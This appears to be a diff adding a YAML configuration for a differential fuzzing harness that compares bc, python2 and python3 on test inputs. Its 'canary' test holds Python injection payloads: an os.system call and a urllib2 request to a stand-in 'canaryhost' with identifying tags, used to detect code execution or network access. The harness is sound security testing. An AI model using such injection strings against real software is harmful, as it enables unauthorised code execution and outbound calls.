@@ -1,0 +1,34 @@
+---
+tests:
+  assertDifferentialTesting: True
+  cuatro:
+    assertStdoutEqual: 4
+    input:
+      - 2
+      - A - 8
+      - 02
+      - 0.1 + 0.2 - 0.3
+    test:
+      - 2 + [[cuatro]]
+      - 0 + [[cuatro]]
+  canary:
+    assertNetwork: False
+    input:
+      - "__import__('os').system('canaryfile')"
+      - "__import__('urllib2').urlopen('http://canaryhost/canaryfile?tag0=[[id]]&tag1=[[softwareid]]&tag2=canarytokenremote')"
+  mutate:
+    - rantes
+    - zzuf
+software:
+  bc:
+    execute: ["bc", "-q", "[[tests]]\nquit"]
+    type: ["File"]
+  python2:
+    execute: ["python2", "-c", "print([[tests]])"]
+  python3:
+    execute: ["python3", "-c", "print([[tests]])"]
+settings:
+  debug: True
+  valgrind: False
+  threads: 100
+  timeout: 10
